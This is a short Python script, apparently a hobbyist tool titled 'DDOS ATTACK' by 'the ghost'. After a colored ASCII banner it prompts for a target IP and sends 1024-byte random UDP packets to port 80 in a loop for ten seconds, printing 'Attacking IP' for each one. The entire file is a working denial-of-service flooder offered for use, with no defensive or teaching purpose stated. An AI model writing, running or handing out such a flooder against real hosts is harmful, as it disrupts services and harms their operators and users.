# create by the ghost

import os
import sys
import time
import socket
import random
import platform

g = '\033[1;32m' 
r = '\033[1;31m' 
y = '\033[1;33m' 
b = '\033[1;36m' 
c = '\033[1;30m' 
w = '\033[1;37m'

def logo():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")
        
    print(g,'''

    ██████╗░██████╗░░█████╗░░██████╗  ░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░██╗
    ██╔══██╗██╔══██╗██╔══██╗██╔════╝  ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝
    ██║░░██║██║░░██║██║░░██║╚█████╗░  ███████║░░░██║░░░░░░██║░░░███████║██║░░╚═╝█████═╝░
    ██║░░██║██║░░██║██║░░██║░╚═══██╗  ██╔══██║░░░██║░░░░░░██║░░░██╔══██║██║░░██╗██╔═██╗░
    ██████╔╝██████╔╝╚█████╔╝██████╔╝  ██║░░██║░░░██║░░░░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗
    ╚═════╝░╚═════╝░░╚════╝░╚═════╝░  ╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝

                            ======================================
                            |            *THE GHOST*             |
                            ======================================
    ''')
    print(y,"\n >> If you want to stop Attack press Ctrl+c. \n")
def ddos():
    logo()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    beytes = random._urandom(1024)
    IP = input(f"{w} >> Enter your IP: ")
    if IP == " " or IP == "":
        ddos()
    else:
        port = 80
        dur = 10
        timeout = time.time() + dur
        sent = 0
        while True:
            try:
                if time.time() > timeout:
                    break
                else:
                    sock.sendto(beytes, (IP, port))
                    sent = sent + 1
                    print(g,f"\n Attacking IP: {IP} Port: 80")
            except KeyboardInterrupt:
                sys.exit()
ddos()
